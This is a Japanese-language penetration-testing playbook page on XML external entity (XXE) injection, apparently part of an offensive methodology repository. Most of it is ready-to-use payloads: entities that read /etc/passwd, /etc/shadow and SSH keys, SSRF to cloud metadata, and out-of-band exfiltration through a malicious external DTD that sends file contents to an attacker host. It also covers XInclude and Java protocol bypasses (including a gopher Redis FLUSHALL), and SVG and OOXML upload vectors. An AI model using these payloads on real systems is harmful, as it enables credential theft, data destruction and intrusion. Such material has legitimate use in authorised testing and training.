# XXE（XML外部エンティティインジェクション）

> **スコープ**: XML を受け付けるエンドポイントへのエンティティインジェクション。クラシック XXE（ファイル読込）〜SSRF 転用〜Blind XXE OOB〜PHP ラッパー〜XInclude〜Java 固有プロトコル〜SVG / OOXML アップロード経由までを扱う。取得した認証情報の処理は `../Credential_Discovery.md`、ハッシュクラックは `../../05_Tools_Reference/Hashcat.md` を参照。

## 着火条件
- Web アプリが XML を入力として受け付けている（フォームの XML アップロード・API の `Content-Type: application/xml`・SOAP リクエスト等）
- サーバー側の XML パーサーが外部エンティティの処理を許可している
- **XML 直接アップロードが無くても XXE 経路がある**:
  - **SVG アップロード**（プロフィール画像・チャート）→ SVG は XML（§9）
  - **OOXML（`.xlsx` / `.docx` / `.pptx`）アップロード**（Excel/Word インポート）→ ZIP + XML 構造（§10）
  - **RSS / Atom フィードのインポート**・**SAML Response の処理**（IdP-Initiated SSO）も XML パーサが裏で動く

## 環境前提
- 実行環境: テスター端末（ペイロード作成）/ ターゲット（XML 処理実行）
- 必要なツール: Burp Suite（リクエスト改ざん）/ テキストエディタ
- Blind XXE にはコールバック受信が必要（`python3 -m http.server`・テスター側の到達可能インターフェースの IP 確認）
- オフライン代替: Blind XXE 用の HTTP サーバーは `python3 -m http.server` で代替可能

## 先に確認すること

- リクエストの `Content-Type` が `application/xml` または `text/xml` か
- フォームに XML ファイルアップロード機能があるか
- エラーメッセージに XML パーサー名（Expat / libxml2 / Xerces 等）が含まれていないか
- SOAP API・REST API で XML を受け付けているか
- **出力の有無で手法が変わる**: エンティティ値がレスポンスに反映される → §1〜§4 クラシック XXE。反映されない → §4 Blind XXE（OOB）

**XXE 成立のシグナル:**

| 観測 | 意味 |
|---|---|
| `&xxe;` がレスポンスに値として展開される | XXE 成立 |
| `DTD is prohibited` / `DOCTYPE is not allowed` | DOCTYPE ブロック有効 → §7 XInclude を試す |
| エンティティ参照がそのまま文字列として出力 | パーサーがエンティティ展開を無効化（XXE 使えない）|

**攻撃者の思考トレース:** XML アップロード機能がなくても SVG・OOXML・SAML 経由の隠れ XML 経路を探す。出力が返るかで手法が分岐する（クラシック vs Blind）。DOCTYPE がブロックされても XInclude で回避できることがある。

---

## 1. クラシック XXE（ファイル読み込み）

**コマンド（ペイロード）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

`<data>` 要素の値がレスポンスに含まれるフィールドで試す。

**ファイルが読めたら次にすること（§1〜§4 共通）:**

`/etc/passwd` の内容が取得できたら以下の順で展開する（`username:x:uid:gid:comment:home:shell` の 7 フィールド・末尾がシェル・6 番目がホーム）:

```
alice:x:1001:1001::/home/alice:/bin/bash     ← 有効（/bin/bash）
www-data:x:33:33::/var/www:/usr/sbin/nologin ← 除外（nologin）
root:x:0:0:root:/root:/bin/bash              ← 有効（root は特に重要）
```

1. 有効ユーザーの資産: `file:///home/[USERNAME]/.ssh/id_rsa`（SSH 秘密鍵）/ `file:///home/[USERNAME]/.bash_history`
2. Web アプリ設定ファイル（ドキュメントルートはアプリ名で特定 → `../../05_Tools_Reference/Searchsploit.md`）
3. `/etc/shadow`（読めればハッシュ → `../../05_Tools_Reference/Hashcat.md`）

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `<data>` に `/etc/passwd` の内容 | XXE 成立 | 上記の順でファイル読み展開 → `../Credential_Discovery.md` |
| `DTD is prohibited` | DOCTYPE ブロック | §7 XInclude へ |
| エンティティ参照がそのまま文字列 | エンティティ展開無効化 | XXE 使えない |

**注意:** `<` や `&` を含むファイルはパースエラーになり内容が出力されない → §6 PHP ラッパー（Base64）を試す。

---

## 2. パスのバリエーション

**コマンド（ペイロード内の ENTITY 行バリエーション）:**

```xml
<!-- Linux の絶対パス -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">

<!-- Windows の場合 -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">

<!-- 相対パス（アプリの動作ディレクトリ起点） -->
<!ENTITY xxe SYSTEM "../../../etc/passwd">
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/proc/self/environ` で環境変数取得 | プロセス環境に API キー等が混入していることがある | 認証情報を抽出 → `../Credential_Discovery.md` |
| `web.config` が読める | IIS / ASP.NET の接続文字列・machineKey | `<connectionStrings>` / `<machineKey>` を確認 |

---

## 3. 内部ネットワーク探索（SSRF 転用）

**コマンド（ペイロード）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| AWS メタデータのパス一覧が返る | AWS EC2 で IMDSv1 有効 | `iam/security-credentials/` まで到達して一時クレデンシャル取得 → `../Credential_Discovery.md` |
| 内部ポートスキャン（`http://127.0.0.1:[PORT]/`）でレスポンスが変わる | 内部ポートスキャン成立 | 開いているポートに対応する内部サービスを特定 |
| 外部ホスト（テスター）へコールバックが届く | SSRF 成立（Blind 含む） | `SSRF.md` の手法でさらに展開 |

---

## 4. Blind XXE（OOB 送出）

コールバック受信が必要。テスター側の到達可能インターフェース（物理 LAN・VPN・専用線等）の IP を `ip a` で確認してから行う。

**事前準備（必須）:**

```bash
# [Attacker] コールバック受信
ip a   # 全インターフェースの IP を確認
python3 -m http.server 8000
```

**コマンド（ペイロード）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://[ATTACKER_IP]:8000/xxe_test">
]>
<root><data>&xxe;</data></root>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| テスター側 HTTP サーバーにリクエストが届く | Blind SSRF 成立 | §5 Blind XXE + 外部 DTD でファイル内容を exfil |
| リクエストが届かない | ネットワーク到達不可 / フィルタ | 到達可能 IP を確認。DNS ルックアップ経由を試す |

**注意:** コールバック受信の詳細 → `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）

---

## 5. Blind XXE + 外部 DTD（ファイル内容の外部送出）

> インライン DTD 内ではパラメータエンティティ（`%`）をコンテンツ内で直接展開できない制約があるため、外部 DTD ファイルに記述を逃がす必要がある。

**事前準備（必須）:** 攻撃側サーバーに外部 DTD ファイルを配置する。

```xml
<!-- [Attacker] evil.dtd として http://[ATTACKER_IP]:8000/evil.dtd に配置 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://[ATTACKER_IP]:8000/?data=%file;'>">
%exfil;
%send;
```

**コマンド（ターゲットに送る XML）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://[ATTACKER_IP]:8000/evil.dtd">
  %remote;
]>
<root><data>trigger</data></root>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| HTTP サーバーの `?data=` クエリにファイル内容が届く | Blind XXE + OOB exfil 成立 | §1 の「ファイルが読めたら」展開へ |
| evil.dtd 取得後に send が発火しない | DTD 内のパラメータエンティティ展開制限 | `&#x25;` エスケープが正しいか確認 |

---

## 6. PHP 環境での Base64 エンコード取得

ファイルに XML として不正な文字（`<` `&` 等）が含まれているとパースエラーになる場合、PHP ラッパーで Base64 化して取得する。

**コマンド（ペイロード内の ENTITY 行）:**

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| レスポンスに Base64 文字列が含まれる | PHP + libxml2 環境で PHP ラッパー有効 | `echo "[BASE64_STRING]" \| base64 -d` でデコード |
| `php://filter` が 404 / エラー | PHP 環境でない / ラッパー無効 | §5 Blind XXE OOB / §7 XInclude へ |

---

## 7. XInclude による DOCTYPE 完全ブロック環境の迂回

`DOCTYPE is not allowed` で DTD が完全に無効化されている環境でも、**XInclude** が有効なら DTD なしでファイル読み込みができる。DTD ブロック（`DOCTYPE`）と XInclude（`xi:include`）は別の仕様で、片方だけ無効化している実装が多い。

**コマンド（ペイロード）:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/etc/passwd` の内容が返る | XInclude 有効 | §1 の「ファイルが読めたら」展開へ |
| XInclude もエラー / 無効 | 両方無効化されている | §3 SSRF 転用 / §9 SVG / §10 OOXML アップロード経路へ |

**注意:** `parse="text"` を付けないと XML としてパースされる（`/etc/passwd` は XML ではないのでエラー）。libxml2 / Xerces / .NET XmlReader が XInclude を有効化していると発火する。

---

## 8. Java 環境特有の SSRF / file read プロトコル

Java の XML パーサ（JAXP / Xerces）は URL handler 経由で多様なプロトコルをサポートしており、`file://` `http://` 以外にも以下が刺さる。

**コマンド（ペイロード内の ENTITY 行バリエーション）:**

```xml
<!-- JAR: jar:!/ を使って ZIP/JAR 内部のファイル読み込み -->
<!ENTITY xxe SYSTEM "jar:http://[ATTACKER_HOST]/evil.jar!/data.txt">

<!-- netdoc: file:// が WAF でブロックされているとき迂回経路 -->
<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">

<!-- ftp: 認証 prompt の有無で内部ホスト存在確認（Blind SSRF 経路） -->
<!ENTITY xxe SYSTEM "ftp://internal-host:21/">

<!-- gopher: 古い Java 8 以下では HTTP / Redis / SMTP に任意プロトコル送信可 -->
<!ENTITY xxe SYSTEM "gopher://internal-host:6379/_FLUSHALL%0d%0aSET%20pwn">
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `netdoc:` でファイル内容が返る | Java レガシー環境・`file://` を迂回 | §1 の展開へ |
| `jar:` が攻撃者 HTTP サーバーに到達 | Java が JAR を取得しようとした | JAR 内部ファイルを制御して情報取得 |
| `ftp:` で Blind SSRF | 内部ホスト存在確認 | 内部ネットワーク探索へ |

**注意:** Java 9 以降は `jdk.xml.disallowDoctypeDecl=true` がデフォルトの環境が増えているが、レガシーアプリ・Spring Boot 2 系・古い Tomcat では未設定のことが多い。

---

## 9. SVG アップロード経由の XXE

プロフィール画像 / アイコン / チャートインポートで SVG が受け入れられる場合、SVG は XML なので XXE ペイロードを仕込める。ImageMagick / Inkscape / librsvg / rsvg-convert 等 SVG をパースするライブラリが DOCTYPE を処理する設定だと発火。

**コマンド（SVG ペイロード）:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="50">&xxe;</text>
</svg>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| SVG が画面に表示されて `<text>` にファイル内容が展開 | クラシック XXE 成立 | §1 の展開へ |
| サムネイル生成のみで内容がレスポンスに出ない | Blind XXE | §4〜§5 の OOB 手法へ切替 |

---

## 10. OOXML（xlsx / docx）経由の XXE

`.xlsx` / `.docx` / `.pptx` は ZIP アーカイブで内部に XML が入っている。Apache POI / docx4j / openpyxl 等がパースするとき DOCTYPE が処理される実装で発火（Apache POI 3.10.1 未満の CVE-2014-3529 等）。

**コマンド:**

```bash
# [Attacker] 1. 正規の .xlsx をコピーして unzip
cp legitimate.xlsx payload.xlsx
unzip payload.xlsx -d payload_unzipped/

# [Attacker] 2. 内部 XML（xl/workbook.xml 等）に DOCTYPE を仕込む
# 先頭の <?xml ...?> の直後に以下を挿入:
#   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# 任意のテキスト要素に &xxe; を埋め込む

# [Attacker] 3. 再圧縮（ZIP として）
cd payload_unzipped/ && zip -r ../payload_xxe.xlsx . && cd ..

# [Attacker] 4. アプリにアップロード → パース時に XXE 発火
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| エラーメッセージにファイル内容が含まれる | XXE 成立（クラシック）| §1 の展開へ |
| 取り込んだスプレッドシートのセル値としてファイル内容が表示 | 同上 | 同上 |
| レスポンスに出ないが OOB コールバックが届く | Blind XXE 成立 | §5 の OOB 手法へ |

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `DTD is prohibited` / `DOCTYPE is not allowed` | DOCTYPE ブロック有効 | §7 XInclude を試す（DTD ブロックと XInclude は別仕様）|
| `Entity 'xxe' not defined` | 宣言構文の誤り | `<!ENTITY xxe SYSTEM "...">` の構文を確認 |
| エンティティ参照がそのまま文字列出力 | エンティティ展開無効化 | XXE は使えない。別脆弱性へ |
| `Cannot resolve URI` | ファイルパス形式の違い / 読込権限不足 | `file://` と `file:///` を試す。Java 環境なら §8（`netdoc:` / `jar:`）へ |
| ファイルを読めるが内容が空 | XML として不正な文字が含まれる | §6 PHP ラッパー（Base64）を試す |
| XML 直接送信ができない | フォームに XML 受付なし | §9 SVG / §10 OOXML / RSS / SAML 等の隠れ XML 経路を探す |

---

## 注意点・落とし穴

- パラメータエンティティ（`%xxe;`）と一般エンティティ（`&xxe;`）を混同すると動作しない。コンテンツ内の参照には `&` を使う
- SOAP リクエストでも XXE が成立する場合がある。`Content-Type: text/xml` に変えてボディに DOCTYPE を挿入して試す
- 多くの最新フレームワーク（Laravel・Spring 等）はデフォルトで外部エンティティを無効化しているため、古い設定のアプリ・カスタムパーサー・古いバージョンで有効なことが多い

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 関連技術
- 前：XML アップロード機能の発見・リクエストの Content-Type 確認 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：ファイル読み込みで認証情報取得 → `../Credential_Discovery.md`
- 後：XSLT 処理が存在する場合は XSLT インジェクションも試す → `XSLT_Injection.md`
- 後：内部ネットワーク探索（SSRF）→ `SSRF.md`
- 後：取得した /etc/shadow ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- 関連：製品構造調査・設定ファイルパスの特定 → `../../05_Tools_Reference/Searchsploit.md`
- 関連：Blind XXE のコールバック受信・到達可能 IP の確認 → `../../06_Concepts/Reverse_Shell.md`
- 関連：XXE が成立する仕組み（XML パーサーの外部エンティティ処理）→ `../../06_Concepts/XSLT_XML_Processing.md`
